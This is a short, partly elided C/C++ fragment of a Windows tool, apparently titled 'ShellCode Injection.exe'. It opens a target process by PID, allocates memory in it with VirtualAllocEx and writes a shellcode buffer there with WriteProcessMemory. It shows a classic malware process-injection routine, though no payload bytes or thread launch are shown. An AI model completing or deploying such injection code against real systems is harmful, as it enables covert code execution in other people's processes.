...
{
  if (argc == 1) {
    printf("[!] Usage: ShellCode Injection.exe <PID>\n");
    return -1;
  }
  ...
  hProcess = OpenProcess(
    PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, TRUE, pid);
  if (!hProcess) {
  ...
  LPVOID pAddress;
  pAddress = VirtualAllocEx(hProcess,
                            nullptr,
                            sizeof(shellcode),
  ...
  if (!WriteProcessMemory(
        hProcess, pAddress, shellcode, sizeof(shellcode), &bytesWritten)) {
